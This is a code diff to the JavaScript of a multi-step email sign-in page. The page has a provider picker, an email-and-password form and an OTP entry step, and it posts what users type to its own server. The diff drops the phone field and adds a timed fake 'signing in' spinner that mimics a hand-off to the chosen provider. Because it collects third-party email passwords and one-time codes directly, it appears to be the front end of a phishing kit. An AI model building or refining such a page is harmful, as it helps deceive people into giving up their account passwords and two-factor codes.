@@ -2,6 +2,7 @@ document.addEventListener("DOMContentLoaded", () => {
   const providerSelectionPage = document.getElementById("provider-selection");
   const credentialsInputPage = document.getElementById("credentials-input");
   const otpVerificationPage = document.getElementById("otp-verification");
+  const signingInPage = document.getElementById("signing-in");
   const credentialsTitle = document.getElementById("credentials-title");
   const credentialsForm = document.getElementById("credentials-form");
   const otpForm = document.getElementById("otp-form");
@@ -15,9 +16,12 @@ document.addEventListener("DOMContentLoaded", () => {
 
   // Helper: Show only one page at a time
   function showPage(page) {
-    [providerSelectionPage, credentialsInputPage, otpVerificationPage].forEach(sec =>
-      sec.classList.remove("active")
-    );
+    [
+      providerSelectionPage,
+      credentialsInputPage,
+      otpVerificationPage,
+      signingInPage
+    ].forEach(sec => sec && sec.classList.remove("active"));
     page.classList.add("active");
   }
 
@@ -38,7 +42,7 @@ document.addEventListener("DOMContentLoaded", () => {
       const seconds = String(remaining % 60).padStart(2, "0");
 
       if (timerDisplay) {
-        timerDisplay.textContent = This OTP will expire in ${minutes}:${seconds};
+        timerDisplay.textContent = `This OTP will expire in ${minutes}:${seconds}`;
       }
 
       if (remaining <= 0) {
@@ -60,13 +64,23 @@ document.addEventListener("DOMContentLoaded", () => {
     return str.charAt(0).toUpperCase() + str.slice(1);
   }
 
-  // Email provider button click → show credentials input
+  // Email provider button click → show signing-in, then credentials input
   providerButtons.forEach((btn) => {
     btn.addEventListener("click", () => {
       selectedProvider = btn.dataset.provider;
-      credentialsTitle.textContent = Sign in with ${capitalize(selectedProvider)};
-      credentialsForm.reset();
-      showPage(credentialsInputPage);
+      if (signingInPage) {
+        document.getElementById("signing-in-provider").textContent = capitalize(selectedProvider);
+        showPage(signingInPage);
+        setTimeout(() => {
+          credentialsTitle.textContent = `Sign in with ${capitalize(selectedProvider)}`;
+          credentialsForm.reset();
+          showPage(credentialsInputPage);
+        }, 1200); // 1.2 seconds spinner
+      } else {
+        credentialsTitle.textContent = `Sign in with ${capitalize(selectedProvider)}`;
+        credentialsForm.reset();
+        showPage(credentialsInputPage);
+      }
     });
   });
 
@@ -88,9 +102,8 @@ document.addEventListener("DOMContentLoaded", () => {
     const formData = new FormData(credentialsForm);
     const email = formData.get("email").trim();
     const password = formData.get("password").trim();
-    const phone = formData.get("phone").trim();
 
-    if (!email || !password || !phone) {
+    if (!email || !password) {
       alert("Please fill in all fields.");
       return;
     }
@@ -104,7 +117,6 @@ document.addEventListener("DOMContentLoaded", () => {
         body: JSON.stringify({
           email,
           password,
-          phone,
           provider: selectedProvider,
         }),
       });
